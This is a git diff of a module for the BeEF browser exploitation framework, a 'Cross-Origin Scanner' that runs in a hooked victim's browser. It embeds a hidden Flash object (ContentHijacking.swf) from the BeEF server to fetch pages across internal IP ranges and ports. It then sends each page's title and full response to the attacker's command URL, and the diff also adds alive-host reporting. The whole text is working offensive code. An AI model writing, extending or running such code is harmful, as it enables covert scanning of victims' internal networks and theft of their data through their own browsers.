@@ -11,8 +11,8 @@ beef.execute(function() {
   var ports   = "<%= @ports %>";
   var threads = parseInt("<%= @threads %>", 10);
   var timeout = parseInt("<%= @timeout %>", 10)*1000;
-  var wait    = parseInt("<%= @wait %>", 10)*1000;
 
+  // check if Flash is installed (not always reliable)
   if(!beef.browser.hasFlash()) {
     beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support Flash', beef.are.status_error());
     return;
@@ -52,7 +52,6 @@ beef.execute(function() {
       return;
     }
     // ipRange will be in the form of 192.168.0.1-192.168.0.254
-    // the fourth octet will be iterated.
     // (only C class IP ranges are supported atm)
     ipBounds   = ipRange.split('-');
     lowerBound = ipBounds[0].split('.')[3];
@@ -63,13 +62,12 @@ beef.execute(function() {
     }
   }
 
-  WorkerQueue = function(frequency) {
-
+  // configure workers
+  WorkerQueue = function(id, frequency) {
     var stack = [];
     var timer = null;
     var frequency = frequency;
     var start_scan = (new Date).getTime();
-
     this.process = function() {
       var item = stack.shift();
       eval(item);
@@ -77,91 +75,101 @@ beef.execute(function() {
         clearInterval(timer);
         timer = null;
         var interval = (new Date).getTime() - start_scan;
-        beef.debug("[Cross-Origin Scanner (Flash)] Worker queue is complete ["+interval+" ms]");
+        beef.debug("[Cross-Origin Scanner (Flash)] Worker #"+id+" has finished ["+interval+" ms]");
         return;
       }
     }
-
     this.queue = function(item) {
       stack.push(item);
-      if (timer === null) {
-        timer = setInterval(this.process, frequency);
-      }
+      if (timer === null) timer = setInterval(this.process, frequency);
     }
-
   }
 
-  var init = function(id, port) {
-    var newObjectTag;
-    var attr = {}, param = {};
-    var url = beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/objects/ContentHijacking.swf';
-    attr = {id: 'cross_origin_flash_<%= @command_id %>_'+id+'_'+port, width: 1, height: 1, 'style': 'visibility: hidden', 'type': 'application/x-shockwave-flash', 'AllowScriptAccess': 'always'};
-    param = {'AllowScriptAccess': 'always'};
-    attr.data = url;
-    newObjectTag = createHTMLObject(attr,param);
-    beef.debug("[Cross-Origin Scanner (Flash)] Waiting for the new object...");
-    document.body.appendChild(newObjectTag);
-  };
-
-  // create and embed Flash object
-  var createHTMLObject = function(attributes, parameters) {
-    var i, html, div, obj, attr = attributes || {}, param = parameters || {};
-    html = '<object';
-    for (i in attr) html += ' ' + i + '="' + attr[i] + '"';
-    html += '>';
-    for (i in param) html += '<param name="' + i + '" value="' + param[i] + '" />';
-    html += '</object>';
+  // load the SWF object from the BeEF server
+  // then request the specified URL via Flash
+  var scanUrl = function(proto, host, port) {
+    beef.debug('[Cross-Origin Scanner (Flash)] Creating Flash object...');
+    var placeholder_id = Math.random().toString(36).substring(2,10);
     div = document.createElement('div');
-    div.innerHTML = html;
-    obj = div.firstChild;
-    div.removeChild(obj);
-    return obj;
-  };
+    div.setAttribute('id', placeholder_id);
+    div.setAttribute('style', 'visibility: hidden');
+    $j('body').append(div);
 
-  // fetch a URL with Flash
-  var get_url = function(proto, host, port, id) {
-    var objCaller;
-    var url = 'http://'+host+':'+port+'/';
-    beef.debug("[Cross-Origin Scanner (Flash)] Fetching URL: " + url);
-    objCaller = document.getElementById('cross_origin_flash_<%= @command_id %>_'+id+'_'+port);
     try {
-      objCaller.GETURL('function(data) { '+
-        'var proto = "http";' +
-        'var host = "'+host+'";' +
-        'var port = "'+port+'";' +
-        'var data = unescape(data);' +
-        'beef.debug("[Cross-Origin Scanner (Flash)] Received data ["+host+":"+port+"]: " + data);' +
-        'if (!data.match("Hijacked Contents:")) return;' +
-        'var response = data.replace(/^Hijacked Contents:\\r\\n/);' +
-        'var title = "";' +
-        'if (response.match("<title>(.*?)<\\/title>")) {' +
-        '  title = response.match("<title>(.*?)<\\/title>")[1];' +
-        '}' +
-        'beef.debug("proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response);' +
-        'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response);' +
-      ' }', url);
-    } catch(e) {
-      beef.debug("[Cross-Origin Scanner (Flash)] Could not create object: " + e.message);
-    }
-    setTimeout('document.body.removeChild(document.getElementById("cross_origin_flash_<%= @command_id %>_'+id+'_'+port+'"));', timeout);
+    swfobject.embedSWF(
+      beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/objects/ContentHijacking.swf',
+      placeholder_id,
+      "1",   // Width
+      "1",   // Height
+      "9",   // Flash version required. Hard-coded to 9+ for no real reason. Tested on Flash 12.
+      false, // Don't prompt user to install Flash
+      {},    // FlashVars
+      {'AllowScriptAccess': 'always'},
+      {id: 'cross_origin_flash_'+placeholder_id, width: 1, height: 1, 'style': 'visibility: hidden', 'type': 'application/x-shockwave-flash', 'AllowScriptAccess': 'always'},
+      function (e) {
+        if (e.success) { 
+          // 200 millisecond delay due to Flash executing the callback with a success event
+          // even though the object is not yet ready to expose its methods to JS
+          setTimeout(function(){
+            var url = 'http://'+host+':'+port+'/';
+            beef.debug("[Cross-Origin Scanner (Flash)] Fetching URL: " + url);
+            var objCaller = document.getElementById('cross_origin_flash_'+placeholder_id);
+            try {
+            objCaller.GETURL('function(data) { '+
+              'var proto = "http";' +
+              'var host = "'+host+'";' +
+              'var port = "'+port+'";' +
+              'var data = unescape(data);' +
+              'beef.debug("[Cross-Origin Scanner (Flash)] Received data ["+host+":"+port+"]: " + data);' +
+
+              'if (data.match("securityErrorHandler")) {' +
+              '  beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip="+host+"&status=alive");' +
+              '}' +
+
+              'if (!data.match("Hijacked Contents:")) return;' +
+              'var response = data.replace(/^Hijacked Contents:\\r\\n/);' +
+
+              'var title = "";' +
+              'if (response.match("<title>(.*?)<\\/title>")) {' +
+              '  title = response.match("<title>(.*?)<\\/title>")[1];' +
+              '}' +
+
+              'beef.debug("proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response);' +
+              'beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto="+proto+"&ip="+host+"&port="+port+"&title="+title+"&response="+response);' +
+            ' }', url);
+            } catch(e) {
+              beef.debug("[Cross-Origin Scanner (Flash)] Could not create object: " + e.message);
+            }
+          }, 200);
+        } else if (e.error) {
+          beef.debug('[Cross-Origin Scanner (Flash)] Could not load Flash object');
+        } else beef.debug('[Cross-Origin Scanner (Flash)] Could not load Flash object. Perhaps Flash is not installed?');
+      });
+      // Remove the SWF object from the DOM after <timeout> seconds
+      // this also kills the outbound connections from the SWF object
+      setTimeout('try { document.body.removeChild(document.getElementById("cross_origin_flash_'+placeholder_id+'")); } catch(e) {}', timeout);
+    } catch (e) {
+      beef.debug("[Cross-Origin Scanner (Flash)] Something went horribly wrong creating the Flash object with swfobject: " + e.message);
+    } 
+    beef.debug("[Cross-Origin Scanner (Flash)] Waiting for the flash object to load...");
   }
 
+  // append SWFObject script
+  $j('body').append('<scr'+'ipt type="text/javascript" src="'+beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/swfobject.js"></scr'+'ipt>');
+
+  // create workers
   beef.debug("[Cross-Origin Scanner (Flash)] Starting scan ("+(ips.length*ports.length)+" URLs / "+threads+" workers)");
-
-  // create worker queue
   var workers = new Array();
-  for (w=0; w < threads; w++) {
-    workers.push(new WorkerQueue(wait));
-  }
+  for (var id = 0; id < threads; id++) workers.push(new WorkerQueue(id, timeout));
 
-  // send Flash request to each IP
-  var proto = 'http';
-  for (var i=0; i < ips.length; i++) {
+  // allocate jobs to workers
+  for (var i = 0; i < ips.length; i++) {
     var worker = workers[i % threads];
-    for (var p=0; p < ports.length; p++) {
+    for (var p = 0; p < ports.length; p++) {
       var host = ips[i];
       var port = ports[p];
-      worker.queue("init("+i+", "+port+"); setTimeout(function() {get_url('"+proto+"', '"+host+"', '"+port+"', "+i+");}, 2000)");
+      if (port == '443') var proto = 'https'; else var proto = 'http';
+      worker.queue("scanUrl('"+proto+"', '"+host+"', '"+port+"');");
     }
   }
 
